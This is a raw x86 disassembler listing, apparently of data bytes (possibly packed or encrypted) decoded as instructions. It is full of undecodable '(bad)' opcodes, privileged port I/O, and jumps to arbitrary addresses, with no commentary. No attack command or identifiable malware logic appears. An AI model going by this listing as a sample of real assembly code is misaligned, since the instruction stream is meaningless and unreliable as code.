  41db4e:	out    0xb1,al
  41db50:	fdivr  st,st(2)
  41db52:	hlt    
  41db53:	mov    dh,0xd1
  41db55:	(bad)  
  41db57:	neg    ch
  41db59:	sti    
  41db5a:	add    ch,dh
  41db5c:	mov    ebx,0xc5e6fa05
  41db62:	out    dx,al
  41db63:	out    0xfa,eax
  41db65:	or     edi,esp
  41db67:	loopne 0x41db2f
  41db69:	mov    esp,0xe7e9efc8
  41db6e:	jmp    0x41db49
  41db70:	in     eax,dx
  41db71:	in     eax,dx
  41db72:	(bad)  
  41db73:	mov    ch,0xb8
  41db75:	(bad)  
  41db76:	stc    
  41db77:	call   0xc31ecb51
  41db7c:	in     al,0xe7
  41db7e:	pop    es
  41db7f:	neg    cl
  41db81:	add    al,0xf4
  41db83:	fimul  DWORD PTR [eax]
  41db85:	jmp    0x41db84
  41db87:	shr    DWORD PTR [ecx-0x3d291f15],cl
  41db8d:	retf   0xd3e9
  41db90:	out    dx,al
  41db91:	stc    
  41db92:	(bad)  
  41db94:	mov    bh,0xbc
  41db96:	mov    ah,0xed
  41db98:	mov    esi,0xf3fee0ce
  41db9d:	ret    
  41db9e:	retf   
  41db9f:	xlat   BYTE PTR ds:[ebx]
  41dba0:	cmc    
  41dba1:	(bad)  
  41dba2:	out    dx,al
  41dba3:	leave  
  41dba4:	add    eax,esp
  41dba6:	add    ch,bl
  41dba8:	out    dx,eax
  41dba9:	rcr    ebp,cl
  41dbab:	(bad)
  41dbae:	out    dx,al
  41dbaf:	lock mov cl,0xc0
  41dbb2:	mov    ecx,0xecf9f7d7
  41dbb7:	mov    ebp,0xd6dde1f6
  41dbbc:	ret    
  41dbbd:	or     ecx,DWORD PTR [ebx]
  41dbbf:	in     eax,0xc0
  41dbc1:	retf   0xd9f7
  41dbc4:	stc    
  41dbc5:	out    dx,al
  41dbc6:	call   0xa935bdd1
  41dbcb:	retf   0xf5d2
  41dbce:	int    0xf0
  41dbd0:	call   0xfe1cc0a7
  41dbd5:	(bad)  
  41dbd6:	mov    edi,0xb5bac3ba
  41dbdb:	cli    
  41dbdc:	ret    0xc20b
  41dbdf:	lock pop es
  41dbe1:	faddp  st(6),st
  41dbe3:	out    dx,al
  41dbe4:	or     dh,al
  41dbe6:	in     eax,0xc0
  41dbe8:	loopne 0x41dbb6
  41dbea:	(bad)  
  41dbeb:	test   al,0xe9
  41dbee:	mov    ah,0xd2
  41dbf0:	stc    
  41dbf1:	int    0xc6
  41dbf3:	fcomp  st(1)
  41dbf5:	mov    ebx,0xcfdecefc
  41dbfa:	icebp  
  41dbfb:	add    eax,eax
  41dbfd:	fimul  WORD PTR [ebx]
  41dbff:	ret    
  41dc00:	stc    
  41dc01:	add    al,al
  41dc03:	in     eax,dx
  41dc04:	into   
  41dc05:	fsubrp st(6),st
  41dc07:	repz icebp 
  41dc09:	(bad)
  41dc0c:	in     al,dx
  41dc0d:	retf   0xf5b2
  41dc10:	call   0xf034b0cc
  41dc15:	mov    ch,0xbb
  41dc17:	fmul   st,st(6)
  41dc19:	aad    0x3
  41dc1b:	mov    ah,0xc6
  41dc1d:	ret    
  41dc1e:	fadd   QWORD PTR [edi]
  41dc20:	in     al,0xfe
  41dc22:	jmp    0xa7d3:0xe3efce0a
  41dc29:	ret    
  41dc2a:	(bad)
  41dc2d:	out    dx,al
  41dc2e:	out    0xd9,eax
  41dc30:	call   0xba3ac3fd
  41dc35:	mov    ebx,0xd6c8d5db
  41dc3a:	out    0xfe,al
  41dc3c:	add    BYTE PTR ds:0xdbc4e0d7,al
  41dc42:	(bad)  
  41dc43:	(bad)  
  41dc44:	out    0xea,eax
  41dc46:	std    
  41dc47:	int3   
  41dc48:	(bad)  
  41dc49:	out    dx,eax
  41dc4a:	repnz shl DWORD PTR [edx-0x342a490b],1
  41dc51:	int    0xd8
  41dc53:	call   0xb937c82a
  41dc58:	mov    esp,0xfae5b9e7
  41dc5d:	cli    
  41dc5e:	idiv   esp
  41dc60:	fisttp QWORD PTR [edi]
  41dc62:	in     al,0xda
  41dc64:	out    0xf,eax
  41dc66:	fist   DWORD PTR [edx]
  41dc68:	mov    esp,0xf5aeeacf
  41dc6d:	lock mov ah,0xbb
  41dc70:	fcmovb st,st(4)
  41dc72:	leave  
  41dc73:	out    0xdb,al
  41dc75:	out    dx,eax
  41dc76:	out    dx,eax
  41dc77:	icebp  
  41dc78:	add    edi,DWORD PTR [esi+eiz*8-0x23f40f2b]
  41dc7f:	sti    
  41dc80:	or     esp,edx
  41dc82:	dec    DWORD PTR [ecx]
  41dc84:	in     al,dx
  41dc85:	call   DWORD PTR [edx]
  41dc87:	jecxz  0x41dc68
  41dc89:	iret   
  41dc8a:	mov    bh,0xd0
  41dc8c:	ret    0xe9cb
  41dc8f:	lods   al,BYTE PTR ds:[esi]
  41dc90:	div    DWORD PTR [edi-0x2052521]
  41dc96:	mov    cl,0x2
  41dc98:	mov    esi,0xd8f0dede
  41dc9d:	fdivr  st,st(4)
  41dc9f:	push   es
  41dca0:	loopne 0x41dca3
  41dca2:	enter  0xed07,0xe5
  41dca6:	std    
  41dca7:	shr    BYTE PTR [edi-0x1b4e363e],0xeb
  41dcae:	mov    al,0xfa
  41dcb0:	clc    
  41dcb1:	mov    eax,0xc8c5ffb9
  41dcb6:	mov    esi,0xbc02f703
  41dcbb:	test   al,0xc4
  41dcbe:	(bad)  
  41dcbf:	in     eax,0xf6
  41dcc1:	inc    DWORD PTR [edx]
  41dcc3:	add    BYTE PTR [edx+eax*1],al
  41dcc6:	shl    ebp,0xe7
  41dcc9:	mov    cl,0xe0
  41dccb:	xlat   BYTE PTR ds:[ebx]
  41dccc:	lock loope 0x41dc8f
  41dccf:	test   al,0xd0
  41dcd1:	sti    
  41dcd2:	retf   
  41dcd3:	mov    bh,0xd5
  41dcd5:	jecxz  0x41dccb
  41dcd7:	std    
  41dcd8:	imul   dh
  41dcda:	out    dx,al
  41dcdb:	loop   0x41dccd
  41dcdd:	cmc    
  41dcde:	in     al,0xd4
  41dce0:	in     al,0xfb
  41dce2:	call   0xeb26a7ca
  41dce7:	add    dh,bl
  41dce9:	(bad)  
  41dcea:	retf   
  41dceb:	(bad)  
  41dcec:	div    esi
  41dcee:	enter  0xbad9,0xf9
  41dcf2:	(bad)  
  41dcf4:	cli    
  41dcf5:	mov    dl,0xee
  41dcf7:	f2xm1  
  41dcf9:	jecxz  0x41dcb0
  41dcfb:	mov    esi,0x4daf6df
  41dd00:	mov    edi,0xfafee6e0
  41dd05:	or     DWORD PTR [edx],eax
  41dd07:	into   
  41dd08:	mov    ebp,0xe2e7e1d0
  41dd0d:	mov    dh,0xe5
  41dd0f:	retf   
  41dd10:	repz jmp 0xf507a907
  41dd16:	cmc    
  41dd17:	(bad)  
  41dd19:	rcl    eax,cl
  41dd1b:	faddp  st(3),st
  41dd1d:	cli    
  41dd1e:	out    0xfc,eax
  41dd20:	(bad)  
  41dd21:	stc    
  41dd22:	loopne 0x41dd19
  41dd24:	int    0xda
  41dd26:	in     al,0x5
  41dd28:	out    dx,eax
  41dd29:	shl    edi,cl
  41dd2b:	out    dx,eax
  41dd2c:	fsubr  st(2),st
  41dd2e:	retf   0xd8e6
  41dd31:	out    dx,eax
  41dd32:	sar    al,cl
  41dd34:	out    dx,eax
  41dd35:	add    edi,ebx
  41dd37:	out    dx,al
  41dd38:	fdivr  QWORD PTR [edi-0x223eff4b]
  41dd3e:	(bad)  
  41dd40:	stc    
  41dd41:	(bad)  
  41dd43:	call   0x707dc28
  41dd48:	ret    0xbdac
  41dd4b:	retf   
  41dd4c:	out    dx,eax
  41dd4d:	(bad)  
  41dd4e:	test   eax,0xd1ead3e6
  41dd53:	mov    ecx,0x1bde8ff
  41dd58:	mov    esp,0xfeb8cf02
  41dd5d:	hlt    
  41dd5e:	ret    0xc605
  41dd61:	mov    dh,0xe1
  41dd64:	fsubrp st(3),st
  41dd66:	or     cl,dh
  41dd68:	ret    
  41dd69:	in     eax,dx
  41dd6a:	xlat   BYTE PTR ds:[ebx]
  41dd6b:	loopne 0x41dd59
  41dd6d:	shl    DWORD PTR [esi-0x20392d1f],1
  41dd73:	std    
  41dd74:	(bad)  
  41dd75:	into   
  41dd76:	(bad)  
  41dd77:	mov    ecx,0xf5cfefe9
  41dd7c:	fiadd  WORD PTR [edx]
  41dd7e:	div    eax
  41dd80:	mov    edi,0xcdafbfc
  41dd85:	out    0x6,al
  41dd87:	adc    ebx,edi
  41dd89:	mov    esi,0xe0e6b7c1
  41dd8e:	enter  0xb1e2,0xd5
  41dd92:	jmp    0x41dd6f
  41dd94:	fnstsw WORD PTR [eax+0xe3db02]
  41dd9a:	cli    
  41dd9b:	into   
  41dd9c:	div    esi
  41dd9e:	jmp    0xdbf4:0xc4d9c3ea
  41dda5:	fisttp DWORD PTR [edi]
  41dda7:	or     esi,ecx
  41dda9:	mov    cl,0xea
  41ddab:	scas   al,BYTE PTR es:[edi]
  41ddac:	shl    ecx,1
  41ddae:	cmc    
  41ddaf:	mov    ebx,0xb6e6dfba
  41ddb4:	stc    
  41ddb5:	sti    
  41ddb6:	shr    edx,cl
  41ddb8:	aam    0xed
  41ddba:	icebp  
  41ddbb:	loope  0x41dda0
  41ddbd:	fld    QWORD PTR [ecx]
  41ddbf:	out    0xca,eax
  41ddc1:	or     BYTE PTR [edx],cl
  41ddc3:	in     al,0xe5
  41ddc5:	out    dx,al
  41ddc6:	add    DWORD PTR [edx],eax
  41ddc8:	jmp    0x41dd9c
  41ddca:	int3   
  41ddcb:	loope  0x41dd95
  41ddcd:	div    BYTE PTR [ecx-0xf140f39]
  41ddd3:	in     eax,0xbb
  41ddd5:	(bad)  
  41ddd7:	stc    
  41ddd8:	clc    
  41ddd9:	(bad)  
  41ddda:	std    
  41dddb:	cli    
  41dddc:	repnz push es
  41ddde:	ret    0xe8e0
  41dde1:	psrad  mm6,mm5
  41dde4:	add    bl,dh
  41dde6:	out    0xf,al
  41dde8:	jmp    0xeeb4:0xd1bccec2
  41ddef:	mov    al,0xcb
  41ddf1:	int    0xf8
  41ddf3:	enter  0xbff8,0xfb
  41ddf7:	aad    0xec
  41ddf9:	fdiv   st(5),st
  41ddfb:	(bad)  
  41ddfc:	sar    DWORD PTR [esi+0x5e4f4d8],1
  41de02:	aad    0xc0
  41de04:	fild   DWORD PTR [edi]
  41de06:	add    al,0xdf
  41de08:	int3   
  41de09:	int3   
  41de0a:	mov    bh,0xc7
  41de0c:	leave  
  41de0d:	mov    ah,0xfa
  41de0f:	int    0xeb
  41de11:	rcr    esi,cl
  41de13:	lock cli 
  41de15:	mov    ecx,0xeffafddf
  41de1a:	mov    ecx,0xc4ffe5d1
  41de1f:	shl    ch,cl
  41de21:	fcmovb st,st(4)
  41de23:	cli    
  41de24:	call   0xe231cd01
  41de29:	shl    DWORD PTR [ebx-0xc154e3b],cl
  41de2f:	cli    
  41de30:	call   0xbe30c3fe
  41de35:	sti    
  41de36:	clc    
  41de37:	sti    
  41de38:	mov    esp,0xdbfae3ce
  41de3d:	shr    bl,1
  41de3f:	in     al,0xf7
  41de41:	out    0x4,eax
  41de43:	faddp  st(6),st
  41de45:	(bad)  
  41de46:	iret   
  41de47:	cli    
  41de48:	repnz xlat BYTE PTR ds:[ebx]
  41de4a:	shr    dl,1
  41de4c:	div    DWORD PTR [ecx-0x320b1a4b]
  41de52:	test   edx,0x2caf7f3
  41de58:	stc    
  41de59:	repnz cld 
  41de5b:	mov    esp,0xb8f7baec
  41de60:	add    cl,BYTE PTR [ebx]
  41de62:	std    
  41de63:	into   
  41de64:	(bad)  
  41de66:	or     eax,0xd3c5ebee
  41de6b:	mov    esp,0xb0f1b0c3
  41de70:	mov    ebx,0xebf3cdec
  41de75:	std    
  41de76:	retf   
  41de77:	retf   0x7d1
  41de7a:	mov    esp,0xdbd8f1be
  41de7f:	(bad)  
  41de80:	fsub   st(0),st
  41de82:	clc    
  41de83:	add    ah,dh
  41de85:	into   
  41de86:	adc    bh,bh
  41de88:	scas   eax,DWORD PTR es:[edi]
  41de89:	fdivrp st(1),st
  41de8b:	mov    dh,0xb4
  41de8e:	loopne 0x41de47
  41de90:	mov    dh,0xcd
  41de92:	out    0xdb,eax
  41de94:	fidiv  WORD PTR [edi+edx*8-0x10408fe]
  41de9b:	in     eax,dx
  41de9c:	add    bh,dh
  41de9e:	lds    eax,FWORD PTR [esi]
  41dea0:	xlat   BYTE PTR ds:[ebx]
  41dea1:	or     DWORD PTR [ebx],ecx
  41dea3:	or     ch,bl
  41dea5:	add    eax,0xcabdd3cd
  41deaa:	mov    dl,0xa8
  41deac:	loopne 0x41de6f
  41deae:	fcmovb st,st(6)
  41deb0:	shl    esp,cl
  41deb2:	enter  0xf2c4,0xdc
  41deb6:	(bad)  
  41deb7:	mov    ebp,0xf9d7f7c3
  41debc:	sar    BYTE PTR [edx-0xbfd3808],0xc8
  41dec3:	(bad)  
  41dec4:	stc    
  41dec5:	clc    
  41dec6:	push   es
  41dec7:	jmp    0xbd24b674
  41decc:	(bad)  
  41decd:	int3   
  41dece:	lods   al,BYTE PTR ds:[esi]
  41decf:	mov    dl,0xf0
  41ded1:	jmp    0xded9:0xbdebb0ec
  41ded8:	rcl    cl,cl
  41deda:	loopne 0x41decc
  41dedc:	test   cl,0xfb
  41dedf:	jecxz  0x41deba
  41dee1:	add    al,0x9
  41dee3:	fcomi  st,st(5)
  41dee5:	int3   
  41dee6:	add    al,0xe4
  41dee8:	jmp    0xb739b0cf
  41deed:	iret   
  41deee:	shl    ch,cl
  41def0:	mov    dh,0xce
  41def2:	icebp  
  41def3:	neg    edi
  41def5:	out    dx,al
  41def6:	sti    
  41def7:	out    dx,eax
  41def8:	mov    esp,0xfdc6dafe
  41defd:	in     al,dx
  41defe:	add    ch,bl
  41df00:	fucom  st(5)
  41df02:	cli    
  41df03:	fild   WORD PTR [ebx]
  41df05:	fisttp QWORD PTR [edx]
  41df07:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df09:	fdiv   DWORD PTR [eax-0x1e55103e]
  41df0f:	out    0xf4,eax
  41df11:	(bad)  
  41df12:	(bad)  
  41df13:	jmp    0xec:0xf3cbccda
  41df1a:	ror    esi,1
  41df1c:	add    al,0xc0
  41df1e:	mov    ebp,0xcbc0fede
  41df23:	fcos   
  41df25:	add    esp,esp
  41df27:	(bad)  
  41df28:	ror    bl,cl
  41df2a:	retf   0xb5af
  41df2d:	jmp    0xd7f6d626
  41df32:	stc    
  41df33:	mov    edi,0xcc03fcd4
  41df38:	in     al,dx
  41df39:	(bad)  
  41df3b:	fld    DWORD PTR [esi]
  41df3d:	lock ffree st(3)
  41df40:	icebp  
  41df41:	loop   0x41df28
  41df43:	loop   0x41df27
  41df45:	add    ecx,DWORD PTR [esi]
  41df47:	clc    
  41df48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df49:	retf   0xa8d0
  41df4c:	jecxz  0x41df3c
  41df4e:	xlat   BYTE PTR ds:[ebx]
  41df4f:	mov    al,0xda
  41df51:	shl    ecx,1
  41df53:	hlt    
  41df54:	int    0xf3
  41df56:	(bad)  
  41df58:	hlt    
  41df59:	clc    
  41df5a:	out    dx,eax
  41df5b:	int    0xdb
  41df5d:	cli    
  41df5e:	ret    
  41df5f:	or     dl,cl
  41df61:	(bad)  
  41df63:	add    al,BYTE PTR ds:0xc000c90c
  41df69:	mov    esp,0xeccef5e3
  41df6e:	lods   al,BYTE PTR ds:[esi]
  41df6f:	(bad)  
  41df70:	mov    dl,0xdf
  41df72:	jmp    0x41df5d
  41df74:	int    0xf3
  41df76:	retf   
  41df77:	add    ecx,ebx
  41df79:	pop    es
  41df7a:	add    dh,bl
  41df7c:	mov    ebx,0xc7fd05e0
  41df81:	(bad)  
  41df82:	mov    ebp,0xaf3d5e5
  41df87:	stc    
  41df88:	loope  0x41df54
  41df8a:	(bad)  
  41df8b:	in     al,0xe0
  41df8d:	retf   0xe4eb
  41df90:	retf   0xd0c6
  41df93:	cmc    
  41df94:	xlat   BYTE PTR ds:[ebx]
  41df95:	stc    
  41df96:	mov    ebp,0xd9f5d9bc
  41df9b:	push   es
  41df9c:	out    0xf1,eax
  41df9e:	sti    
  41df9f:	inc    ebx
  41dfa1:	(bad)  
  41dfa3:	inc    ebp
  41dfa5:	dec    dl
  41dfa7:	cli    
  41dfa8:	in     eax,dx
  41dfa9:	jmp    0xc6ce:0xd1b7c1c6
  41dfb0:	(bad)  
  41dfb1:	out    0xcf,eax
  41dfb3:	mov    al,0xb9
  41dfb5:	iret   
  41dfb6:	out    dx,al
  41dfb7:	cli    
  41dfb8:	leave  
  41dfb9:	sti    
  41dfba:	shl    ebp,0xf8
  41dfbd:	add    eax,0xd0f804d2
  41dfc2:	fsub   st(7),st
  41dfc4:	enter  0xcbe0,0xff
  41dfc8:	test   al,0xb1
  41dfca:	test   al,0xe0
  41dfcc:	mov    al,0xdb
  41dfce:	test   dl,0xc8
  41dfd1:	in     al,0xb0
  41dfd3:	mov    ch,0xfd
  41dfd5:	jmp    0xbcdd:0xedfbd4f7
  41dfdc:	out    0x6,eax
  41dfde:	lds    edi,FWORD PTR [ebx+ebp*8-0x6f42a15]
  41dfe5:	enter  0xf3e6,0xcd
  41dfe9:	scas   eax,DWORD PTR es:[edi]
  41dfea:	mov    cl,0xf5
  41dfec:	jmp    0xf8e7:0xf4cfd4d3
  41dff3:	mov    ah,0xde
  41dff5:	mov    eax,0xc2e0e1db
  41dffa:	add    ebx,ebx
  41dffc:	ret    
  41dffd:	loop   0x41dffa
  41dfff:	icebp  
  41e000:	(bad)
  41e003:	std    
  41e004:	add    eax,0xaede02fd
  41e009:	jmp    0x41dfb8
  41e00b:	out    dx,al
  41e00c:	mov    cl,0xe6
  41e00e:	sar    cl,cl
  41e010:	shr    edx,cl
  41e012:	enter  0xd9d0,0xb4
  41e016:	dec    cl
  41e018:	int3   
  41e019:	fcomip st,st(3)
  41e01b:	std    
  41e01c:	(bad)  
  41e01e:	fdiv   st(3),st
  41e020:	loope  0x41e01a
  41e022:	add    cl,BYTE PTR [edi]
  41e024:	add    DWORD PTR [esi],eax
  41e026:	or     al,0xf
  41e028:	in     al,0xc6
  41e02a:	jmp    0x41dfea
  41e02c:	mov    bl,0xe6
  41e02e:	mov    al,0xce
  41e030:	hlt    
  41e031:	retf   
  41e032:	mov    ecx,0xf5d1d6e6
  41e037:	jmp    0xc743a13a
  41e03c:	fimul  WORD PTR [ebx]
  41e03e:	retf   
  41e03f:	push   es
  41e040:	clc    
  41e041:	(bad)  
  41e043:	loopne 0x41e049
  41e045:	into   
  41e046:	fucom  st(7)
  41e048:	mov    esp,0xc5f5d2e5
  41e04d:	shl    al,0xb6
  41e050:	mov    bh,0xd8
  41e052:	(bad)  
  41e053:	mov    ch,0xf8
  41e055:	iret   
  41e056:	in     al,dx
  41e057:	add    DWORD PTR [edx-0x2080600],edi
  41e05d:	icebp  
  41e05e:	out    0x3,eax
  41e060:	clc    
  41e061:	test   DWORD PTR [edx],0xccc4f803
  41e067:	push   cs
  41e068:	retf   
  41e069:	lods   al,BYTE PTR ds:[esi]
  41e06a:	retf   0xf4b0
  41e06d:	into   
  41e06e:	repz jmp 0xceb4:0xf8cddbd5
  41e076:	jmp    0xe312be4b
  41e07b:	clc    
  41e07c:	jecxz  0x41e075
  41e07e:	mov    ebp,0xe80bc002
  41e083:	pop    es
  41e084:	loop   0x41e07e
  41e086:	(bad)  
  41e087:	fcmovbe st,st(1)
  41e089:	rol    bl,1
  41e08b:	scas   al,BYTE PTR es:[edi]
  41e08c:	jmp    0xbfd6:0xe0e9d1ee
  41e093:	fyl2xp1 
  41e095:	jecxz  0x41e092
  41e097:	ffree  st(3)
  41e099:	out    0xfc,eax
  41e09b:	fdiv   st,st(0)
  41e09d:	int3   
  41e09e:	sar    eax,0xe4
  41e0a1:	sti    
  41e0a2:	fsubr  st,st(1)
  41e0a4:	(bad)  
  41e0a6:	int3   
  41e0a7:	(bad)  [eax+ebp*4-0x18385252]
  41e0ae:	(bad)  
  41e0af:	out    0xea,al
  41e0b1:	ror    ebp,cl
  41e0b3:	(bad)  
  41e0b4:	in     al,0xbc
  41e0b6:	repz fnstenv [edi-0xd29320c]
  41e0bd:	ret    
  41e0be:	fisttp WORD PTR [ecx]
  41e0c0:	ret    0xfbfd
  41e0c3:	fcmovnu st,st(2)
  41e0c5:	jmp    0x41e093
  41e0c7:	pop    es
  41e0c8:	sar    DWORD PTR [edi-0x133e4341],1
  41e0ce:	jmp    0xc62ed995
  41e0d3:	stc    
  41e0d4:	jmp    0x41e08c
  41e0d6:	out    dx,eax
  41e0d7:	int3   
  41e0d8:	repnz fstp st(6)
  41e0db:	xlat   BYTE PTR ds:[ebx]
  41e0dc:	(bad)  
  41e0de:	aad    0xf4
  41e0e0:	shl    edi,1
  41e0e2:	jmp    0xd9ca:0xcf00f5ee
  41e0e9:	out    dx,eax
  41e0ea:	test   al,0xf3
  41e0ec:	ret    
  41e0ed:	mov    al,0xd4
  41e0ef:	out    0xc1,eax
  41e0f1:	clc    
  41e0f2:	fyl2xp1 
  41e0f4:	(bad)  
  41e0f5:	jecxz  0x41e0c4
  41e0f7:	std    
  41e0f8:	icebp  
  41e0f9:	hlt    
  41e0fa:	mov    edi,0xebe2c6e1
  41e0ff:	lock fcomip st,st(6)
  41e102:	out    0xca,al
  41e104:	ret    
  41e105:	add    eax,DWORD PTR ds:0xa8cfe5eb
  41e10b:	(bad)  
  41e10c:	stos   DWORD PTR es:[edi],eax
  41e10d:	fcomi  st,st(7)
  41e10f:	test   al,0xd0
  41e111:	mov    dh,0xd1
  41e113:	aad    0xe8
  41e115:	out    dx,al
  41e116:	(bad)  
  41e118:	dec    ebp
  41e11a:	cli    
  41e11b:	ret    
  41e11c:	fadd   DWORD PTR [eax]
  41e11e:	rcr    eax,0xfc
  41e121:	in     al,0xf8
  41e123:	fcmovnu st,st(5)
  41e125:	fcmove st,st(5)
  41e127:	out    0xbe,eax
  41e129:	ret    0xe2a8
  41e12c:	mov    ch,0xb1
  41e12e:	(bad)  
  41e12f:	xlat   BYTE PTR ds:[ebx]
  41e130:	int3   
  41e131:	icebp  
  41e132:	shl    esp,1
  41e134:	sti    
  41e135:	mov    esi,0xe303cdec
  41e13a:	shl    cl,cl
  41e13c:	sar    edx,cl
  41e13e:	jecxz  0x41e142
  41e140:	jmp    0x41e108
  41e142:	pop    es
  41e143:	sti    
  41e144:	pop    es
  41e145:	(bad)  
  41e146:	jmp    0xe4e4:0xf2c2bcfd
  41e14d:	ror    bl,0xd2
  41e150:	fcmovbe st,st(4)
  41e152:	retf   0xfdf2
  41e155:	jmp    0x41e115
  41e157:	fcmovnu st,st(3)
  41e159:	jecxz  0x41e13b
  41e15b:	in     al,dx
  41e15c:	repz vcmppd ymm3,ymm1,ymm4,0xda
  41e162:	cld    
  41e163:	or     cl,BYTE PTR [eax]
  41e165:	enter  0xdae4,0xcd
  41e169:	scas   eax,DWORD PTR es:[edi]
  41e16a:	loopne 0x41e153
  41e16c:	out    dx,al
  41e16d:	mov    cl,0xc2
  41e16f:	(bad)  
  41e170:	(bad)  
  41e171:	aam    0xe8
  41e173:	call   eax
  41e175:	cld    
  41e176:	rcr    ecx,1
  41e178:	mov    ebx,0x2f0ecbd
  41e17d:	mov    esp,0xd0fed2c1
  41e182:	leave  
  41e183:	std    
  41e184:	or     bh,bh
  41e186:	loopne 0x41e193
  41e188:	vpslld xmm5,xmm7,XMMWORD PTR [edi-0x3e0d2911]
  41e190:	mov    bh,0xd8
  41e192:	cmc    
  41e193:	(bad)  
  41e194:	mov    edx,0xbcfecf03
  41e199:	fild   DWORD PTR [eax]
  41e19b:	mov    eax,0xf6fbe4c5
  41e1a0:	rcl    esp,0xe
  41e1a3:	pinsrw mm4,esi,0x7
  41e1a7:	in     eax,dx
  41e1a8:	mov    dl,0xc6
  41e1aa:	sar    BYTE PTR [esi-0x4e3a1a23],cl
  41e1b0:	out    dx,eax
  41e1b1:	out    dx,eax
  41e1b2:	out    dx,al
  41e1b3:	mov    edi,0xbdd4ffda
  41e1b8:	mov    bh,0xc1
  41e1ba:	ret    0xc7d0
  41e1bd:	mov    DWORD PTR [ecx],0xd7fd07d4
  41e1c3:	(bad)  
  41e1c6:	loopne 0x41e1db
  41e1c8:	mov    esi,0xf1cfcbcf
  41e1cd:	call   0xdaf6c9b6
  41e1d2:	(bad)  
  41e1d3:	idiv   ecx
  41e1d5:	lock jmp 0xf21ed6a5
  41e1db:	fsubr  st(2),st
  41e1dd:	in     al,dx
  41e1de:	clc    
  41e1df:	add    bl,ah
  41e1e1:	pop    es
  41e1e2:	push   cs
  41e1e3:	loop   0x41e1da
  41e1e5:	or     ebp,edi
  41e1e7:	out    dx,eax
  41e1e8:	retf   
  41e1e9:	in     al,dx
  41e1ea:	(bad)  [edi-0xb165120]
  41e1f0:	(bad)  
  41e1f1:	(bad)  
  41e1f2:	aam    0xb6
  41e1f4:	repz div esi
  41e1f7:	jmp    0xc231bcd2
  41e1fc:	std    
  41e1fd:	out    0xb9,eax
  41e1ff:	ret    0xd8da
  41e202:	(bad)
  41e205:	push   cs
  41e206:	clc    
  41e207:	icebp  
  41e208:	int    0xd2
  41e20a:	out    0xb1,eax
  41e20c:	mov    cl,0xf0
  41e20e:	(bad)
  41e211:	(bad)  
  41e212:	imul   DWORD PTR [ecx+edx*8-0x3e2a004c]
  41e219:	repnz rcr ebx,1
  41e21c:	fcmovnu st,st(6)
  41e21e:	loop   0x41e224
  41e220:	(bad)
  41e224:	aam    0x7
  41e226:	add    edi,eax
  41e228:	icebp  
  41e229:	retf   
  41e22a:	in     al,0xb2
  41e22c:	leave  
  41e22d:	(bad)  
  41e22e:	mov    cl,0xd0
  41e230:	retf   0xf2ce
  41e233:	clc    
  41e234:	mov    ebx,0xb7f6d9f9
  41e239:	enter  0xd807,0xd3
  41e23d:	cld    
  41e23e:	add    dl,al
  41e240:	fld    DWORD PTR [edi+esi*8]
  41e243:	rol    BYTE PTR [edi],0x1
  41e246:	repz fcomip st,st(2)
  41e249:	retf   0xd0b0
  41e24c:	mov    bh,0xcf
  41e24e:	retf   
  41e24f:	in     al,0xf8
  41e251:	out    0xfa,al
  41e253:	fprem  
  41e255:	mov    eax,0xfa01bfed
  41e25a:	sti    
  41e25b:	ret    
  41e25c:	fiadd  DWORD PTR ds:0x2c3d50a
  41e262:	fcmovne st,st(6)
  41e264:	cli    
  41e265:	ret    0xe212
  41e268:	fsubr  QWORD PTR [esp+eiz*8-0x3414521d]
  41e26f:	mov    edx,0xc4cfb1ea
  41e274:	div    DWORD PTR [esi+edi*4-0x10094126]
  41e27b:	sti    
  41e27c:	cli    
  41e27d:	mov    esp,0xdec103f6
  41e282:	fild   WORD PTR ds:0xe900d4c9
  41e288:	ffree  st(7)
  41e28a:	xlat   BYTE PTR ds:[ebx]
  41e28b:	cmc    
  41e28c:	(bad)
  41e290:	mov    bl,0xf6
  41e292:	mov    eax,0x3bbe8b9
  41e297:	(bad)  
  41e298:	enter  0xc0b9,0xfa
  41e29c:	rol    edx,cl
  41e29e:	jmp    0xe5ed:0xc0dadac6
  41e2a5:	fcmove st,st(5)
  41e2a7:	rcr    ah,cl
  41e2a9:	mov    esp,0xe7d6d3df
  41e2ae:	shr    al,1
  41e2b0:	mov    ah,0xb9
  41e2b2:	mov    edx,0xfcdcebc4
  41e2b7:	ror    esi,cl
  41e2b9:	(bad)  
  41e2bb:	cli    
  41e2bc:	rol    edi,1
  41e2be:	jecxz  0x41e2c0
  41e2c0:	out    0xf8,al
  41e2c2:	mov    ebp,0xe4d405f9
  41e2c7:	icebp  
  41e2c8:	lock loopne 0x41e2bc
  41e2cb:	repnz loopne 0x41e27a
  41e2ce:	iret   
  41e2cf:	mov    ch,0xcc
  41e2d1:	into   
  41e2d2:	stc    
  41e2d3:	fst    st(7)
  41e2d5:	add    edi,edi
  41e2d7:	(bad)  
  41e2d9:	fsub   st,st(0)
  41e2db:	cli    
  41e2dc:	jecxz  0x41e2cf
  41e2de:	push   es
  41e2df:	neg    bh
  41e2e1:	fisttp QWORD PTR [ebx]
  41e2e3:	add    ebx,ecx
  41e2e5:	pslld  mm6,mm3
  41e2e8:	fnop   
  41e2ea:	(bad)  
  41e2ec:	cmc    
  41e2ed:	hlt    
  41e2ee:	iret   
  41e2ef:	fldz   
  41e2f1:	fnsetpm(287 only) 
  41e2f3:	out    0xec,al
  41e2f5:	iret   
  41e2f6:	jmp    0x41e2e2
  41e2f8:	mov    edi,0xfdfc06c3
  41e2fd:	jecxz  0x41e309
  41e2ff:	rol    ch,1
  41e301:	out    0xc1,eax
  41e303:	std    
  41e304:	out    dx,eax
  41e305:	cld    
  41e306:	jmp    0xf5cb:0xebc8f013
  41e30d:	jmp    0xbc0bd7e8
  41e312:	rol    ch,cl
  41e314:	jmp    0x32197e9
  41e319:	rol    ebx,1
  41e31b:	hlt    
  41e31c:	repz fst st(1)
  41e31f:	fsubr  st(7),st
  41e321:	mov    esi,0xddebc4cf
  41e326:	pop    es
  41e327:	(bad)  
  41e329:	shr    al,1
  41e32b:	in     al,dx
  41e32c:	(bad)  
  41e32d:	ret    0xb4cb
  41e330:	aam    0xb5
  41e332:	enter  0xd6ef,0xd1
  41e336:	jecxz  0x41e309
  41e338:	cmc    
  41e339:	mov    edx,0xccfae3bf
  41e33e:	pop    es
  41e33f:	stc    
  41e340:	push   es
  41e341:	add    esp,ecx
  41e343:	clc    
  41e344:	loop   0x41e31a
  41e346:	adc    bl,dl
  41e348:	ret    0xd2a6
  41e34b:	(bad)  
  41e34c:	rol    esi,cl
  41e34e:	retf   0xebcd
  41e351:	mov    cl,0xf9
  41e353:	int    0xb4
